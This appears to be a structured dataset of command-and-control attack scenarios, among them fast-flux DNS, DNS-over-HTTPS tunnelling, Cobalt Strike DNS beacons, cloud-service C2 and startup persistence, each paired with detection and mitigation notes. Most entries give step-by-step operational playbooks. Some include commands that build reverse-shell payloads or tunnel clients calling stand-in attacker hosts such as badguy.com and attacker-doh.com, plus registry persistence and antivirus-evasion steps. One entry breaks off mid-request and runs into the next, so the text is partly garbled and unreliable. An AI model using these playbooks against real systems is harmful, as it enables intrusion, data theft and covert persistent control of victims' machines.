Title: Fast-Flux DNS
Attack Type: Rapid DNS Record Switching for C2
Scenario Description: Attackers use fast-flux DNS to map a single domain to multiple, rapidly changing IP addresses, obscuring the C2 server’s location and making it harder to block or take down the malicious infrastructure.
Tools Used: Metasploit, Cobalt Strike, Python, dig, Wireshark
Attack Steps: Step 1: Understand the Goal – The attacker wants their C2 server to stay online despite attempts to block it. Fast-flux DNS links one domain (e.g., badguy.com) to many IP addresses that change quickly (e.g., every few minutes), so blocking one IP doesn’t stop the malware.Step 2: Set Up a Fast-Flux Network – Rent multiple virtual servers (e.g., from bulletproof hosting providers or compromised cloud instances) with different IPs (e.g., 192.168.1.1, 172.16.2.2). Register a domain like badguy.com and configure its DNS records to point to these IPs using a low Time-To-Live (TTL, e.g., 60 seconds). Use a tool like nsupdate or a DNS provider’s API to rotate IPs frequently.Step 3: Create Malware with Fast-Flux Support – Generate a payload in Metasploit: msfvenom -p windows/meterpreter/reverse_https LHOST=badguy.com LPORT=443 -f exe > flux_malware.exe. The malware is coded to connect to badguy.com, which resolves to different IPs over time. Alternatively, write a Python script to query badguy.com repeatedly for the latest IP.Step 4: Deliver the Malware – Send flux_malware.exe via phishing email, disguised as software_patch.exe, or host it on a fake site (e.g., https://fakesoftware.com/patch.exe). The victim runs the file, infecting their system.Step 5: Initial DNS Resolution – The malware queries badguy.com, which resolves to one of the IPs (e.g., 192.168.1.1). The DNS server returns a new IP on each query due to the low TTL and round-robin DNS setup. The malware connects to the resolved IP via HTTPS.Step 6: Rotate IP Addresses – Update the DNS records for badguy.com every few minutes to point to new IPs (e.g., from 192.168.1.1 to 172.16.2.2). Use a script to automate this via the DNS provider’s API. Even if one IP is blocked, the malware resolves a new one on the next query.Step 7: Establish C2 Communication – The malware sends an HTTPS request to badguy.com/connect (resolving to the current IP) with system info. Your server responds with commands like screenshot or upload_file. The connection remains active despite IP changes.Step 8: Exfiltrate Data – The malware sends stolen data (e.g., credentials) via HTTPS POST to badguy.com/upload, encoded in base64. The server, reachable via the current IP, saves the data. Rapid IP changes make blocking difficult.Step 9: Ensure Persistence – Add the malware to the Windows registry (HKCU\Software\Microsoft\Windows\CurrentVersion\Run) or Startup folder. In Metasploit, use run persistence -U -i 300 -p 443 -r badguy.com to reconnect via the fluxing domain.Step 10: Cover Tracks – Use HTTPS to encrypt traffic and a legitimate-looking domain name. Set up a fake webpage on badguy.com to disguise the server. Low TTL values ensure IPs change before defenders can block them.Step 11: Expand the Attack (Optional) – Use the malware to spread to other systems (arp_scanner) or escalate privileges (getsystem). Add new IPs to the fast-flux pool to maintain resilience.Step 12: Adapt to Defenses – If the domain is blocked, register a new one and update the malware via a C2 command. If IPs are blocked, add new servers to the pool. Obfuscate the malware with tools like TheFatRat to evade antivirus.
Vulnerability: Weak DNS monitoring, lack of IP blocklist updates
Impact: Persistent access, data theft, botnet control
Detection Method: Monitor DNS for low TTL values and rapid IP changes; analyze traffic for single-domain-to-many-IP patterns
Solution: Use DNS-layer security to block fast-flux domains; collaborate with ISPs to take down malicious DNS records
Tags: Fast Flux, C2, Malware, DNS Evasion

Title: DNS Tunneling over HTTPS
Attack Type: Data Exfiltration via DNS over HTTPS
Scenario Description: Attackers encode data in DNS queries sent over HTTPS (DoH) to a malicious resolver, bypassing traditional DNS monitoring and exfiltrating data or receiving C2 commands covertly.
Attack Steps: Step 1: Understand the Goal – The attacker wants to send data (e.g., stolen files) or receive commands through DNS queries, which are often allowed through firewalls. Using HTTPS (DoH) encrypts these queries, making them look like normal web traffic.Step 2: Set Up a Malicious DoH Server – Rent a server and install a DoH resolver (e.g., using dns2tcp or a custom Python script). Configure it to listen for HTTPS-encapsulated DNS queries on https://attacker-doh.com:443. Register a domain (attacker-doh.com) and set up an SSL/TLS certificate (e.g., via Let’s Encrypt) for HTTPS.Step 3: Create Malware with DoH Tunneling – Use a tool like dnscat2 to create a tunneling client: dnscat2 --dns server=attacker-doh.com,port=443 --security=encrypted > tunnel_malware.exe. Alternatively, code a Python script using pydoh to send DNS queries over HTTPS. The malware encodes data (e.g., files) into DNS queries (e.g., data.stolen.attacker-doh.com).Step 4: Deliver the Malware – Send tunnel_malware.exe via phishing, disguised as system_update.exe, or host it on a fake site (e.g., https://fakesystem.com/update.exe). The victim runs it, infecting their system.Step 5: Establish the DoH Tunnel – The malware sends DNS queries over HTTPS to attacker-doh.com (e.g., GET /dns-query?data=encoded_stolen_data). The queries are encrypted, appearing as normal HTTPS traffic to port 443, bypassing DNS monitoring.Step 6: Encode and Exfiltrate Data – The malware encodes stolen data (e.g., passwords) into DNS query names (e.g., password123.attacker-doh.com). The DoH server decodes the query and saves the data. For example, dnscat2 splits data into small chunks and sends them as subdomains.Step 7: Receive C2 Commands – The DoH server responds to queries with commands encoded in DNS responses (e.g., TXT records containing run_shell:whoami). The malware decodes and executes the commands, such as keylogging or file uploads.Step 8: Maintain the Tunnel – The malware sends periodic DoH queries (e.g., every 5 minutes) to keep the tunnel active. The HTTPS encryption hides the DNS traffic from traditional firewalls.Step 9: Ensure Persistence – Add the malware to the Windows registry (HKCU\Software\Microsoft\Windows\CurrentVersion\Run) or Startup folder. For dnscat2, configure it to reconnect automatically if the tunnel drops.Step 10: Cover Tracks – Use HTTPS to encrypt queries, making them indistinguishable from normal web traffic. Use a legitimate-looking domain (e.g., attacker-doh.com posing as a tech site). Keep query volumes low to avoid suspicion.Step 11: Expand the Attack (Optional) – Use the tunnel to download additional malware or spread to other systems. Commands like dnscat2’s exec can run scripts to escalate privileges or scan the network.Step 12: Adapt to Defenses – If the DoH server is blocked, switch to a new domain or IP. Modify the malware to use a different DoH resolver or obfuscate queries with tools like iodine. Redeploy the updated malware via C2 commands.
Vulnerability: Unmonitored DNS over HTTPS traffic, weak firewall rules
Impact: Data exfiltration, persistent C2, network compromise
Detection Method: Monitor HTTPS traffic for DNS query patterns; use DoH-aware firewalls; analyze query names for encoded data
Solution: Block untrusted DoH resolvers; enforce strict DNS filtering; use EDR to detect tunneling behavior
Tags: DNS Tunneling, DoH, C2, Data Exfiltration

Title: Cobalt Strike with DNS Tunneling via Malleable C2
Attack Type: Covert C2 Over DNS Using Malleable Profiles
Scenario Description: Attacker sets up a stealthy DNS-based Command-and-Control (C2) channel using Cobalt Strike's Malleable C2 profiles to avoid detection in a monitored or segmented network environment.
Tools Used: Cobalt Strike, dig, Wireshark, dnschef, dnscat2, Kali Linux
Attack Steps: Step 1: Attacker installs and configures Cobalt Strike on a Kali Linux system (or similar red teaming box) that has internet access. Step 2: They generate a custom Malleable C2 profile using existing templates (e.g., from https://github.com/rsmudge/Malleable-C2-Profiles) or create a new .profile file that mimics legitimate DNS traffic. This configures how the C2 traffic looks (domain, query structure, timing, headers). Step 3: On the attack server, attacker sets up teamserver with the custom profile using the command: ./teamserver [VPS_IP] [password] [profile.profile]. Step 4: Attacker configures the profile to use DNS beaconing (set beacon_dns true) and sets the listener type in Cobalt Strike to DNS. Step 5: On the target side, attacker gains initial access via phishing (malicious document with a macro, drive-by download, or USB drop). The payload is a Cobalt Strike beacon configured for DNS communication. Step 6: Once the beacon is executed, it performs DNS queries to the attacker's domain (e.g., abc.attacker.com) which is controlled via nameserver redirection to the attack server (using a domain registered by attacker with NS records pointing to VPS). Step 7: Each DNS request carries a chunk of encrypted beacon traffic, mimicking a normal DNS query (A, TXT, or CNAME record). Step 8: The attacker's DNS server (e.g., dnschef or dnscat2 or built-in Cobalt DNS server) extracts the data from the queries and responds with commands (like run command, download file, spawn shell) in encoded DNS responses. Step 9: Victim beacon continues polling the DNS server at specified intervals, blending into legitimate DNS traffic using randomized jitter and headers per malleable profile. Step 10: Attacker now has full remote control of the victim machine via DNS, bypassing most firewalls and proxies which often allow DNS. Step 11: For stealth, attacker tunes the profile to throttle DNS traffic (longer sleep time, random domains, HTTP-like structure in DNS queries). Step 12: Attacker may exfiltrate small files or issue lateral movement commands using the same DNS channel. Step 13: Blue team finds it hard to detect unless deep DNS traffic inspection is enabled. Wireshark or Zeek logs might show abnormal TXT/CNAME traffic. Step 14: Attacker maintains persistence by scheduling beacon as a hidden startup task or service on Windows. Step 15: Attacker tears down infrastructure once objective is complete, removing DNS records and destroying logs on VPS.
Vulnerability: DNS allowed for egress without inspection
Detection Method: Monitor outbound DNS for long/random subdomains; detect abnormal record types (e.g., excessive TXT records); inspect beacon jitter patterns
Solution: Block external DNS unless via internal resolver; implement deep DNS inspection; block known C2 domains with threat intel
Tags: Cobalt Strike, DNS Tunneling, Malleable C2, Covert C2, Red Team

Title: WebSocket-Based Command-and-Control
Scenario Description: Malware uses WebSocket protocol over HTTPS to maintain live, bidirectional communication with attacker server, bypassing traditional HTTP detection methods.
Attack Steps: Step 1: Attacker sets up a server using Flask or Node.js to host a WebSocket server (e.g., wss://attacker.site/control).Step 2: Attacker builds or modifies malware to initiate a WebSocket connection to this server upon execution (can be embedded in a malicious document, installer, or payload).Step 3: Once victim executes malware, it initiates a secure WebSocket (wss://) connection to the attacker’s server.Step 4: The connection allows persistent, full-duplex (2-way) communication between attacker and victim, unlike traditional HTTP polling.Step 5: Attacker sends live commands (e.g., whoami, file exfiltration, keylogging, screenshots) directly to the victim, and the malware sends back responses instantly.Step 6: Because it’s over HTTPS, the traffic is encrypted and resembles normal web traffic, blending with legitimate sites like Slack or Discord.Step 7: The malware may keep the connection open as long as the system is online or reconnect periodically using keepalive pings.Step 8: Defender detection is tough without TLS termination (SSL inspection) or WebSocket-specific logging like in Zeek/Suricata.Step 9: Attacker may encode commands in JSON to resemble app traffic.Step 10: To evade further, the attacker can host WebSocket endpoint on a compromised CDN or use domain fronting to legitimate domains.
Impact: Persistent stealthy C2, hard to detect via standard proxy logs
Detection Method: Inspect WebSocket handshake/upgrade headers; analyze TLS SNI/DNS logs; monitor persistent HTTPS sessions
Solution: Enforce proxy restrictions on unknown WebSocket hosts; use SSL decryption; log WebSocket upgrade events
Tags: WebSocket, HTTPS C2, Live C2, Encrypted Channel

Title: Social Media or Web Service Abuse for C2
Attack Type: HTTP/S-Based C2 via Social Media or Web-Based Services
Scenario Description: Malware avoids dedicated C2 servers by using cloud apps (Twitter, Dropbox, Google Sheets) to exchange commands and data, bypassing detection and IP reputation checks.
Tools Used: Twitter API, Google Sheets API, PowerShell, cURL, Browser
Attack Steps: Step 1: Attacker creates a legitimate cloud account on Twitter, Dropbox, or Google Sheets (e.g., @control_feed on Twitter or commands.xlsx on Google Drive).Step 2: Uploads commands into these platforms (e.g., in a tweet body, in a specific cell of a Google Sheet, or as a Dropbox text file).Step 3: Malware on victim’s system uses legitimate HTTP/S API calls to read this content periodically (e.g., using curl, PowerShell Invoke-RestMethod, or custom code).Step 4: Malware parses the command from this response and executes it (e.g., powershell injection, file execution).Step 5: Output or exfiltrated data is uploaded back using API write calls (e.g., uploading file to Dropbox or updating a Google Sheet cell).Step 6: All traffic goes over HTTPS to trusted domains (e.g., api.twitter.com, googleapis.com), avoiding firewalls or DLP alerts.Step 7: Attacker can remotely update commands or disable the beaconing by deleting content on the cloud account.Step 8: Blue teams find it hard to blacklist major services or inspect HTTPS APIs without SSL decryption.Step 9: Attack persists as long as the cloud account is active and beaconing task is scheduled.Step 10: Highly stealthy technique often seen in APT malware like Turla, Lazarus, or FIN7.
Vulnerability: Overtrust in social and SaaS services
Impact: Cloud-abuse for stealth, C2 hidden in trusted traffic
Detection Method: Log API access to external services; rate-limit unusual use; monitor specific endpoint patterns
Solution: Restrict direct cloud access from endpoints; use API allowlists; detect excessive JSON parsing or file reads
Tags: SaaS Abuse, Social Media C2, Stealth C2, APT

Title: Long-Haul Beaconing to Avoid Detection
Scenario Description: Malware beacons only once per long period (e.g., daily or weekly), reducing detection chances and blending into background traffic.
Tools Used: Cobalt Strike, Mythic, PoshC2, DNS tools
Attack Steps: Step 1: Attacker configures malware or beacon to sleep for long intervals (e.g., 24 hours) between each C2 connection. In Cobalt Strike, set sleep 86400 (seconds) with jitter for randomness.Step 2: On victim system, beacon runs as a background task or memory-resident implant, waiting silently.Step 3: When beacon wakes, it makes a small HTTPS/DNS request to attacker’s server for new instructions.Step 4: Because of infrequent traffic, it's hard for defenders to spot any pattern in logs or detect as persistent C2.Step 5: Attacker issues low-noise commands only when beacon is online (e.g., file listing, keylogger start, or screenshot capture).Step 6: Any exfiltrated data is chunked and returned over the next beacon cycle.Step 7: Defender logging systems may rotate logs or only store short time windows, causing beacon traffic to be missed.Step 8: Malware may even randomize the beaconing time using a sleep+jitter formula to appear like human usage.Step 9: Combined with encryption, proxy evasion, or domain fronting, the beacon becomes nearly invisible to standard detection.Step 10: Attacker may combine this with dormant implant logic (e.g., only beacon when user is idle or after hours).
Vulnerability: Infrequent outbound traffic is not flagged
Impact: Highly stealthy, long-term access, minimal footprint
Detection Method: Look for periodic outbound connections to rare domains; correlate with user activity time windows
Solution: Increase log retention, monitor for even rare domains, implement beaconing time anomaly detection
Tags: Sleep Beacon, Low-Noise C2, Long-Haul C2, APT

Title: In-Memory Only C2 Beacons
Scenario Description: Malware never writes to disk, resides only in memory, and communicates with attacker via HTTP/S or DNS, making forensic recovery extremely difficult.
Tools Used: Cobalt Strike, PowerShell, Memory tools (Mimikatz, PE-Sieve)
Attack Steps: Step 1: Attacker creates a payload (using tools like Cobalt Strike or PowerShell Empire) that is fully memory-resident – i.e., it loads into RAM and never touches disk.Step 2: Delivery happens via phishing, drive-by download, or fileless infection (e.g., malicious macro or LOLBin abuse like rundll32, mshta).Step 3: Once executed, the malware injects itself into a legitimate process (e.g., explorer.exe, svchost.exe) using process injection techniques.Step 4: Beacon runs from memory and initiates encrypted outbound connection to attacker server over HTTPS or DNS.Step 5: Commands are received, executed in-memory (e.g., file search, clipboard steal), and responses are sent back immediately.Step 6: Because it doesn’t write anything to disk, antivirus and EDR tools relying on file signatures fail to detect it.Step 7: If the system reboots, the malware dies (unless separate persistence was set up with a re-dropper).Step 8: Defender forensic tools (disk-based) will find no file traces; only memory dumps or active process scans will reveal the implant.Step 9: Malware may use reflective DLL injection or PowerShell script blocks to avoid creating child processes.Step 10: Attacker maintains stealthy C2 communication using obfuscation, encrypted channels, and random jittering.
Vulnerability: Lack of memory monitoring & forensics tools
Impact: Undetectable fileless C2, high stealth, hard recovery
Detection Method: Use memory scanning tools (PE-Sieve, Volatility); monitor childless network connections
Solution: Enable AMSI, use memory-based EDR detection, limit PowerShell/LOLBin abuse, hunt in RAM
Tags: Fileless, In-Memory, RAM C2, Stealth Implant

Title: Trojanized Startup Items
Scenario Description: Malware achieves persistence by embedding itself into system startup locations (e.g., registry, startup folders), beaconing to the C2 every time the system reboots or user logs in.
Tools Used: PowerShell, reg.exe, autoruns, Task Scheduler, Cobalt Strike
Attack Steps: Step 1: Attacker creates a beacon payload that communicates with a C2 server (HTTPS listener set up via Cobalt Strike or a Flask/Node backend).Step 2: Malware is delivered using phishing, USB, or drive-by techniques and gets executed on the victim system.Step 3: To maintain persistence, malware copies itself to a hidden location (e.g., C:\Users\User\AppData\Roaming\svchost.exe).Step 4: It then uses PowerShell or reg.exe to add a startup registry key: reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v OneDrive /t REG_SZ /d "C:\...\svchost.exe".Step 5: Optionally, the attacker creates a scheduled task using schtasks /create to re-run the payload at login or boot.Step 6: On every system startup, the payload runs automatically, and it starts beaconing to the attacker’s C2 over HTTPS.Step 7: Communication is encrypted, and the beacon runs in the background using hidden PowerShell windows or injected processes.Step 8: Defender may not detect unless reviewing startup entries or monitoring unexpected outbound HTTPS from user login events.Step 9: Attacker can now control the system every time it boots or logs in.Step 10: For deeper stealth, the malware may spoof file names (e.g., svchost.exe, OneDrive.exe) and hide in AppData or ProgramData.
Vulnerability: Startup registry and task creation allowed
MITRE Technique: T1547 – Boot or Logon Autostart Execution
Detection Method: Monitor startup registry keys; track login-time process trees; check hidden scheduled tasks
Solution: Lock registry/persistence changes; enable startup script monitoring; use EDRs that flag autorun abuse
Tags: Persistence, Startup Malware, HTTP/S Beacon, Autostart

Title: Custom HTTP/S Protocols
Attack Type: Custom Protocol Abuse over Encrypted Channels
Scenario Description: Malware communicates via modified HTTP/S headers or traffic structure that avoids signature-based detection and evades known IOC scanning.
Tools Used: Python/Flask, Cobalt Strike, Burp Suite, Wireshark
Attack Steps: Step 1: Attacker creates a C2 server using Python/Flask or Cobalt Strike with a custom Malleable C2 profile.Step 2: They configure the profile to modify HTTP request structure (e.g., using X-Command, custom URIs like /assets/img.php, fake User-Agent, and encoded POST/GET payloads).Step 3: The beacon payload is generated to match this custom HTTP structure.Step 4: Victim executes malware, which connects to the attacker's server using HTTPS with custom headers and URIs, bypassing deep packet inspection (DPI).Step 5: Since the communication is over HTTPS, security tools without SSL inspection only see domain name and not payload.Step 6: Even tools with decryption struggle because the requests look like harmless API calls or web assets.Step 7: Attacker issues commands, receives encrypted data, all wrapped in fake HTTP packets (like mimicking Facebook CDN or jQuery scripts).Step 8: Security products looking for default Cobalt Strike patterns (like /submit.php) will not catch the altered path and headers.Step 9: Defender must inspect request frequency, user-agent anomalies, and SNI/timestamp fingerprinting.Step 10: This technique is widely used in APT malware like Cobalt Strike, Empire, and Sliver.
MITRE Technique: T1090 – Proxy; T1071.001 – Custom Web Protocol
Impact: Evasion of known IOC and signature-based blocks
Detection Method: Analyze HTTP headers and URIs; detect anomalies in common endpoint user-agents; inspect behavior not just payload
Solution: Enforce strict header validation; log unusual endpoint API paths; use behavioral EDR detection
Tags: Custom Headers, CobaltStrike Evasion, TLS Abuse

Title: Proxy and Redirector Chains
Scenario Description: C2 infrastructure uses chained redirectors and proxies (e.g., VPS hops, cloud servers) to obfuscate the real backend server, complicating tracing and takedown efforts.
Tools Used: HAProxy, Apache mod_rewrite, redirector.py, Cobalt Strike
Attack Steps: Step 1: Attacker rents multiple VPS servers from different cloud providers (e.g., AWS, DigitalOcean, GCP).Step 2: Configures each as a reverse proxy or redirector using nginx, HAProxy, or simple socat rules.Step 3: Attacker hosts the real C2 server at the final hop, protected by authentication and firewall rules (only allows traffic from proxies).Step 4: The beacon payload is configured to connect to the first proxy server (e.g., c2-gateway1.com).Step 5: Traffic hops from one redirector to another until it reaches the actual C2 server.Step 6: This multi-layer redirection hides the real attacker's location and prevents defenders from discovering or blocking the real backend.Step 7: If one redirector is burned (e.g., domain detected), attacker swaps or updates DNS to reroute via another chain.Step 8: Attacker can monitor traffic at any hop for blue team analysis and deploy decoys.Step 9: Combined with CDN fronting or IP rotation, this makes blocking or sinkholing very difficult.Step 10: Advanced red teams and malware (e.g., FIN6, APT29) commonly use this method.
Detection Method: Map external traffic flows; use TLS fingerprinting and IP correlation; examine SNI vs payload mismatch
Solution: Centralized proxy logging; block unexpected cloud hop chains; use threat intel on redirector infrastructure
Tags: Proxy Chains, C2 Obfuscation, Redirection, VPS C2

Title: Mimicking Legitimate Applications
Scenario Description: Malware disguises itself as legitimate software (e.g., Chrome, OneDrive, or Windows Services), and uses similar folder names, icons, and network behavior to avoid suspicion.
Attack Steps: Step 1: Attacker crafts malware payload and uses tools like Resource Hacker or SigThief to change its icon, metadata, and version info to match a known app (e.g., chrome.exe, onedriveupdater.exe).Step 2: Names the file accordingly and drops it in a plausible directory (e.g., C:\ProgramData\Google\Chrome\chrome.exe).Step 3: Sets up persistence using registry keys or scheduled tasks under names like GoogleUpdater or Windows Defender Proxy Handler.Step 4: Configures the beacon to use domains and user-agents that match the legitimate app (e.g., User-Agent: Mozilla/5.0 Chrome/91.0 and GET /update/check).Step 5: The malware begins beaconing over HTTPS using intervals and patterns similar to the real app, hiding in expected traffic volumes.Step 6: Some versions even emulate UI or display fake update messages if clicked.Step 7: The C2 traffic is tunneled behind normal app behavior, which helps evade network monitoring tools that whitelist known traffic patterns.Step 8: Defender tools that only check filename or folder paths won’t raise alerts since it mimics standard software paths.Step 9: Forensics tools may only find it through deep binary analysis, comparing hashes, or verifying digital signatures.Step 10: APT groups (like APT28 and Mustang Panda) have used this method to avoid detection for months in enterprise networks.
Vulnerability: User trust in filename and folder paths
Impact: Evasion, persistent C2, social engineering deception
Detection Method: Monitor file hashes, validate signed binaries; audit folder structure and running process paths
Solution: Enforce application allowlists; verify digital signatures of executables; use anomaly-based EDR
Tags: Masquerading, Fake App, UI Spoofing, Legitimate Path Abuse

Title: SSL/TLS Certificate Abuse
Attack Type: Use of Stolen or Forged SSL Certs to Masquerade C2 Traffic
Scenario Description: Attackers leverage stolen, self-signed, or fraudulent SSL/TLS certificates to make C2 channels appear trustworthy and evade SSL inspection systems.
Attack Steps: Step 1: Attacker obtains or generates a trusted-looking SSL certificate. This could be (a) self-signed with spoofed details, (b) from a free CA like Let's Encrypt, or (c) a stolen cert from breached servers.Step 2: The certificate is configured on a malicious C2 server (e.g., Apache or Flask with HTTPS enabled).Step 3: Malware is built to communicate with this C2 using HTTPS, and during the TLS handshake, it presents the fake or stolen cert.Step 4: Since the cert is technically "valid" and matches a legitimate domain (or appears generic), most corporate firewalls and AVs allow the connection.Step 5: The C2 traffic looks identical to normal HTTPS (port 443, valid TLS handshake), making it hard to detect without deep SSL inspection.Step 6: Defender tools that rely only on certificate issuer and common name (CN) filtering won’t flag it unless certificate pinning is in place.Step 7: This technique also avoids common detection by proxy logs, since it uses generic or impersonated domains.Step 8: If paired with CDN fronting or wildcard certs, attacker can make the C2 server look like it’s hosted on a major provider (e.g., *.azurewebsites.net).Step 9: Certificates may be rotated periodically to further evade detection.Step 10: Defender must correlate cert fingerprint with known bad infrastructure or use JA3/SNI fingerprinting for detection.
Impact: C2 channel impersonates trusted HTTPS sessions
Detection Method: JA3/SNI fingerprinting, TLS Cert issuer logs, OCSP mismatch checks
Solution: Use SSL inspection, enforce cert pinning, block self-signed/untrusted certs, log unusual TLS CN/SAN patterns
Tags: SSL Abuse, Cert Forgery, HTTPS C2, TLS Spoofing

Title: Randomized URI Patterns
Attack Type: Evasion via Changing URIs in HTTP/S Requests
Scenario Description: Malware avoids detection by randomizing paths, filenames, or request URIs in HTTP/S traffic to evade static rule-based detection systems.
Tools Used: Cobalt Strike, Sliver, Python Requests, Burp Suite
Attack Steps: Step 1: Attacker configures their C2 server to accept a wide range of URIs (e.g., /file/abc123, /api/9sdf8d, /image/ping.png) using wildcard routing in Flask or Apache.Step 2: The beacon or malware is programmed to generate random URIs per request or session.Step 3: These URIs may change using simple random generators, timestamps, UUIDs, or even malware-specific rules (e.g., base64-encoded hostnames).Step 4: For example, one beacon might call /upload/20240712_xyz.png while the next might call /resync/88kltz/file.css.Step 5: This breaks detection rules that rely on static patterns like /c2.php or /beacon.json.Step 6: Defender logs may appear full of random or junk HTTP paths, which most analysts ignore.Step 7: The actual data (commands or exfiltration) is still embedded in standard HTTP headers or POST data.Step 8: Attacker can mix in common file extensions (e.g., .css, .png, .json) to make traffic blend with real app assets.Step 9: If using CDN redirectors or web fronting, these requests appear as static asset fetches.Step 10: Detection requires entropy analysis, HTTP URI path length analysis, or frequency-based pattern hunting.
Vulnerability: Static URI detection logic is bypassed
Detection Method: Analyze entropy or randomness in URI paths; monitor low-traffic random endpoints
Solution: Use behavior-based detection on HTTP clients; alert on URI randomness across sessions
Tags: Random URIs, HTTP C2 Evasion, Beacon Obfuscation

Title: Data Exfiltration via HTTP/S
Attack Type: Exfil of Sensitive Data in HTTP POST Requests
Scenario Description: Malware uses HTTP POST requests to send stolen files or data to attacker-controlled servers, appearing like normal web uploads or form submissions.
Tools Used: curl, Python Flask, Wireshark, ngrok, Cobalt Strike
Attack Steps:
Step 1: Attacker sets up a listener server (Flask or Cobalt Strike HTTPS listener) that accepts POST requests at endpoints like /upload.php or /submit.Step 2: Malware is deployed on the victim machine and begins searching for sensitive files (e.g., .docx, .xls, browser history, cookies, saved credentials).Step 3: It zips or base64-encodes the data and wraps it inside a POST request payload (e.g., POST /submit HTTP/1.1

Title: Botnet Coordination
Attack Type: Distributed C2 via Peer-to-Peer or API Synchronization
Scenario Description: Multiple infected machines (bots) coordinate with each other or a central API to receive commands, updates, or targets, creating a resilient C2 network.
Tools Used: P2P botnet frameworks (P2P Zeus, Emotet), Wireshark, PsExec
Attack Steps: Step 1: Attacker spreads malware to multiple victim systems (via phishing, drive-by downloads, USBs, etc.), turning them into bots.Step 2: Each infected host is configured with either a hardcoded central API or a list of peer IPs (other bots).Step 3: When the malware runs, it reaches out to one or more peers to request the latest command or update.Step 4: If peer-based, bots exchange small beacon messages (e.g., "version", "command ID") to ensure synchronization.Step 5: If centralized, attacker uses public infrastructure (e.g., Pastebin, GitHub, Telegram) where bots pull down instructions encoded in base64 or obfuscated formats.Step 6: Bots execute commands such as DDoS targets, credential scraping, or further spreading logic.Step 7: Data or output is either uploaded back to the API or passed between peers.Step 8: Bots can work even if some peers or C2 APIs go offline, increasing resilience.Step 9: Defender cannot disable the botnet by taking down a single server – coordination continues via backup methods or offline syncing.Step 10: Advanced botnets use encryption, domain generation algorithms (DGAs), or blockchains to update peers.
Vulnerability: Lack of centralized monitoring of peer behavior
Impact: Resilient C2, DDoS, coordinated mass attack
Detection Method: Look for coordinated traffic across infected hosts; detect beaconing patterns or unknown peer handshakes
Solution: Block known botnet traffic; isolate infected peers; deploy P2P traffic detection; disable unused protocols
Tags: Botnet, P2P C2, Distributed Coordination, DGA

Title: Code Injection via HTTP/S
Attack Type: Script or Binary Injection via HTTP/S C2 Response
Scenario Description: C2 servers deliver executable code, scripts, or shell commands embedded in HTTP/S response content to infected systems.
Tools Used: Python Flask, PowerShell, Cobalt Strike, curl
Attack Steps: Step 1: Attacker sets up an HTTPS C2 server using Flask or Cobalt Strike that listens for incoming connections from infected clients.Step 2: A malware implant is deployed on the target machine (via phishing, trojanized installer, etc.), configured to contact the C2 over HTTPS.Step 3: The implant sends a beacon (e.g., GET /checkin) to the C2, including its status and unique identifier.Step 4: The C2 responds with a specially crafted payload inside the HTTP body — this could be obfuscated PowerShell code, shell commands, or a Base64-encoded DLL.Step 5: The implant decodes the payload and executes it in memory using Invoke-Expression or exec() (depending on platform/language).Step 6: Execution may trigger downloads, privilege escalation, lateral movement, or exfiltration.Step 7: Since all traffic is over HTTPS and mimics browser traffic, firewalls and IDS typically won’t flag it.Step 8: The attacker updates the payload logic based on collected host data for future stages.Step 9: Optional sandbox-evasion checks may be run by the implant before execution (e.g., user inactivity, uptime).Step 10: Detection is difficult unless HTTPS content is decrypted or memory monitoring is enabled.
Impact: Remote code execution, persistence, C2 control
Detection Method: Memory monitoring; SSL decryption; behavior-based anomaly detection
Solution: Block untrusted HTTPS endpoints; inspect memory processes; use EDRs with script execution detection
Tags: Code Injection, HTTPS Payload, Memory Execution

Title: Command Queue Polling
Attack Type: Polling-Based C2 for Async Command Retrieval
Scenario Description: Malware polls a C2 server at intervals to check for queued commands, executes them, and optionally returns results — enabling stealthy communication.
Tools Used: Cobalt Strike, HTTP server, Task Scheduler, PowerShell
Attack Steps: Step 1: Attacker sets up a C2 server with a backend database or file that stores commands per compromised host ID (e.g., cmds/client_001.txt).Step 2: Malware on the victim machine runs a timer (e.g., every 5 minutes) and sends a GET /poll?id=001 request to the C2 server.Step 3: The C2 responds with a command string, often encoded (e.g., echo Hello, powershell -encodedCommand..., or Python code).Step 4: The implant executes the command using native tools like cmd.exe, bash, or PowerShell’s Invoke-Expression.Step 5: Output is captured (e.g., via stdout redirection) and sent back via a POST /result request to the C2.Step 6: The process repeats in an endless loop, with beacon intervals randomized to avoid detection.Step 7: Since there’s no persistent connection, detection is difficult — traffic appears like regular web polling.Step 8: Commands can be updated by the attacker at any time using a simple web form, DB, or API.Step 9: Defender logs may show repeated outbound HTTPS requests to the same domain, but contents are hidden by TLS.Step 10: This technique is widely used in malware like TrickBot, Emotet, and Cobalt Strike stagers.
Impact: Stealthy C2 communication, modular attack flow
Detection Method: Monitor for repeated, low-volume HTTPS polling; use DNS sinkholing; analyze beacon patterns
Solution: Block known C2 domains; enable EDR telemetry; restrict outbound polling to trusted services
Tags: HTTP Polling, Command C2, Async Beacon

Title: SSL Inspection Evasion
Attack Type: TLS/SSL Inspection Bypass via Cert Pinning or Obfuscation
Scenario Description: Malware intentionally avoids SSL/TLS inspection by using certificate pinning or wrapping encrypted data in unknown formats.
Tools Used: Android APKs, Cobalt Strike, custom OpenSSL, Frida
Attack Steps: Step 1: Attacker creates a malware sample or implant that communicates with a C2 server over HTTPS or TLS using a specific pinned certificate.Step 2: Certificate pinning means the malware only trusts a specific certificate fingerprint — so if a firewall tries to intercept TLS using its own cert, the connection fails.Step 3: Attacker may embed the cert fingerprint or public key directly into the malware binary.Step 4: During operation, the malware attempts to connect only if the server cert exactly matches the expected pin.Step 5: Defender tools like SSL inspection appliances (e.g., Zscaler, Blue Coat) can't decrypt or analyze traffic since malware refuses to connect.Step 6: In mobile or IoT devices, attackers use custom SSL stacks or wrap traffic using non-standard ports or protocols (e.g., gRPC over TLS).Step 7: Malware may further obfuscate communication using XOR or AES encryption inside the HTTPS tunnel.Step 8: All traffic appears as valid TLS handshakes with no known threat signatures.Step 9: Defender has no visibility into command content or exfil unless full behavioral or memory analysis is done.Step 10: This technique is used in malware like LokiBot, Android spyware, and advanced Red Team implants.
Detection Method: TLS JA3/SNI fingerprinting; detect failed intercepts; behavioral endpoint monitoring
Solution: Disable outbound pinning unless required; monitor handshake failures; enforce TLS proxying for all apps
Tags: SSL Pinning, TLS Bypass, Obfuscation, Inspection Evasion

Title: HTTP/S over Non-Standard Ports
Attack Type: Port Obfuscation to Evade Protocol Detection
Scenario Description: Malware uses HTTP/S protocols over non-standard ports (not 80/443) to bypass firewalls and evade detection engines tuned for common ports.
Tools Used: Netcat, Flask, Nginx, Cobalt Strike, Wireshark
